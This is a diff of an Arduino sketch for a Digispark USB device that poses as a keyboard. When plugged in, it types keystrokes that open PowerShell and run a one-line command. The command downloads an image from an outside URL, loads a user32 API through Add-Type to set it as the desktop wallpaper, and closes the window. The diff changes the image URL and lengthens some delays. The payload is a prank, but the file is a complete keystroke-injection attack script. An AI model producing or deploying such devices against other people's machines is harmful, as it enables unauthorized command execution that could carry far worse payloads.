@@ -1,6 +1,7 @@
 #include "DigiKeyboard.h"
 
 void setup() {
+  delay(3000);
   DigiKeyboard.sendKeyStroke(0); // wake up
 
   DigiKeyboard.delay(500);
@@ -9,14 +10,15 @@ void setup() {
 
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1500);
+  DigiKeyboard.delay(3000);
 
   // Your corrected PowerShell command
-  DigiKeyboard.print("$p=$env:TEMP+'\\\\bg.jpg';iwr 'https://i.ibb.co/9m4j8mTw/saidsecurity-wallppr.jpg' -OutFile $p;$s='[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);';Add-Type -MemberDefinition $s -Name a -Namespace b;[b.a]::SystemParametersInfo(20,0,$p,3)");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
+  DigiKeyboard.print("$p=$env:TEMP+'\\\\bg.jpg';iwr 'https://i.ibb.co/BKYLQvHN/saidsecurity-wallppr.jpg' -OutFile $p;$s='[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);';Add-Type -MemberDefinition $s -Name a -Namespace b;[b.a]::SystemParametersInfo(20,0,$p,3)");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(8000);
   // Give enough time for download and wallpaper update
-  DigiKeyboard.delay(7000); // 7 seconds (adjust if needed)
+  // 8seconds (adjust if needed)
 
   // Close PowerShell window
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); 
@@ -35,5 +37,4 @@ void setup() {
 void loop() {
   // nothing here
 }
-
 
